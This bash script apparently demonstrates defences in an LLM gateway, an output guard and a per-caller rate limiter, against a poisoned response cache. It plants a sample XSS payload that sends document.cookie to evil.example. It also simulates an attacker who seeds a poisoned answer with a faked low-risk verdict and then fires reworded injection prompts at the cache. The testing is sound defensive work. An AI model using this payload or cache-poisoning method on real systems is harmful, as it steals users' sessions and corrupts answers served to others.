#!/usr/bin/env bash
# Phase 3: show the output guard and the rate limiter working on the real gateway.
#
#   1. output guard   a cached answer carrying a <script> payload is planted.
#                     off: served.  flag: served, marked.  block: refused.
#   2. rate limiter   a poisoned answer is planted, then one caller fires
#                     every rewording of that attack three times over, as the
#                     Phase 2 attack does. With a limit of 20 a minute, the
#                     rest get 429, while a second caller is unaffected.
#
# Real models, mock provider (free). Output is saved to data/mitigations/demo.txt.
set -euo pipefail
cd "$(dirname "$0")/.."
GW=http://127.0.0.1:8000
OUT=data/mitigations
mkdir -p "$OUT"
export BUILD_SHA="$(git rev-parse --short HEAD 2>/dev/null || echo unknown)" \
       PROVIDER_MODE=mock PIPELINE_ORDER=cache_first SIM_THRESHOLD=0.85 SCREENING_SCORER=hf \
       CACHE_EMBEDDER=hf CACHE_BACKEND=auto HF_HUB_OFFLINE=1 ALLOW_CACHE_SEED=on \
       REDIS_HOST_PORT="${REDIS_HOST_PORT:-6380}" LOG_FILE=mitigations/requests.jsonl
docker compose --profile phase2 up -d qdrant redis >/dev/null
rm -f "$OUT/requests.jsonl"
HDR="$(mktemp)"; BODY="$(mktemp)"; export HDR BODY
trap 'rm -f "$HDR" "$BODY"' EXIT

start_gateway() {  # output guard, rpm
    OUTPUT_GUARD="$1" RATE_LIMIT_RPM="$2" docker compose up -d --force-recreate gateway >/dev/null 2>&1
    for _ in $(seq 1 90); do curl -sf "$GW/healthz" >/dev/null 2>&1 && return 0; sleep 3; done
    echo "Gateway did not come up" >&2; exit 1
}
ask() {  # question, api key -> "status | headers we care about | first 70 chars of the answer"
    curl -s -D "$HDR" -o "$BODY" "$GW/v1/chat/completions" -H 'content-type: application/json' \
        -H "Authorization: Bearer $2" \
        -d "$(python3 -c 'import json,sys; print(json.dumps({"model":"gpt-4o-mini","messages":[{"role":"user","content":sys.argv[1]}]}))' "$1")"
    python3 - <<'PY'
import json, os
head = open(os.environ["HDR"]).read().splitlines()
status = head[0].split()[1]
keep = {k.lower(): v.strip() for k, v in (l.split(":", 1) for l in head[1:] if ":" in l)}
body = json.load(open(os.environ["BODY"]))
text = body["choices"][0]["message"]["content"] if "choices" in body else body["error"]["message"]
flags = keep.get("x-sentrygate-output-flags", "-")
print(f"  {status} | cache {keep.get('x-sentrygate-cache', '-'):4} | output flags {flags:6} | {text[:70]}")
PY
}

QUESTION="How do I reset my account password?"
PAYLOAD='Click here to reset: <script>fetch("https://evil.example/?c="+document.cookie)</script>'

{
echo "== 1. Output guard: a cached answer with a script payload =="
for mode in off flag block; do
    start_gateway "$mode" 0
    curl -s "$GW/v1/cache/clear" -X POST >/dev/null
    curl -s "$GW/v1/cache/seed" -H 'content-type: application/json' \
        -d "$(python3 -c 'import json,sys; print(json.dumps({"prompt":sys.argv[1],"response":sys.argv[2],"model":"gpt-4o-mini"}))' "$QUESTION" "$PAYLOAD")" >/dev/null
    echo "OUTPUT_GUARD=$mode, a user asks a reworded question:"
    ask "how do I reset my account password" user-key
done

echo
echo "== 2. Rate limiter: one caller probing the cache, limit 20 a minute =="
start_gateway off 20
curl -s "$GW/v1/cache/clear" -X POST >/dev/null
python3 - "$GW" <<'PY'
import json, sys, urllib.request, urllib.error
gw = sys.argv[1]
seed = json.loads(open("data/week4/seeds.jsonl").readline())
plant = urllib.request.Request(f"{gw}/v1/cache/seed", method="POST",
    data=json.dumps({"prompt": seed["text"], "response": "SENTRYGATE-POISON", "model": "gpt-4o-mini",
                     "verdict": {"is_injection": False, "injection_score": 0.05, "has_pii": False,
                                 "pii_entities": [], "intent": "other", "risk_level": "low"}}).encode(),
    headers={"content-type": "application/json"})
urllib.request.urlopen(plant, timeout=30)
variants = [json.loads(l) for l in open("data/week4/variants.jsonl")]
texts = [v["text"] for v in variants if v["seed_id"] == seed["seed_id"]] * 3
codes, poisoned = [], 0
for t in texts:
    req = urllib.request.Request(f"{gw}/v1/chat/completions", method="POST",
        data=json.dumps({"model": "gpt-4o-mini", "messages": [{"role": "user", "content": t}]}).encode(),
        headers={"content-type": "application/json", "Authorization": "Bearer attacker-key"})
    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            codes.append(resp.status)
            poisoned += "SENTRYGATE-POISON" in resp.read().decode()
    except urllib.error.HTTPError as e:
        codes.append(e.code)
print(f"  attacker sent {len(codes)} requests in one burst")
names = {200: "answered", 403: "blocked by the filter", 429: "refused, rate limit"}
for c in sorted(set(codes)):
    print(f"    {c} {names.get(c, '')}: {codes.count(c)}")
print(f"  poisoned answers the attacker got: {poisoned} (all inside the first minute's 20)")
honest = urllib.request.Request(f"{gw}/v1/chat/completions", method="POST",
    data=json.dumps({"model": "gpt-4o-mini", "messages": [{"role": "user", "content": "what is the capital of France?"}]}).encode(),
    headers={"content-type": "application/json", "Authorization": "Bearer honest-key"})
print(f"  a different, honest caller at the same moment: status {urllib.request.urlopen(honest, timeout=30).status}")
PY
echo
echo "Rate limit counts kept in: $(curl -s $GW/healthz | python3 -c 'import json,sys; print(json.load(sys.stdin)["rate_limit"]["backend"])')"
} | tee "$OUT/demo.txt"
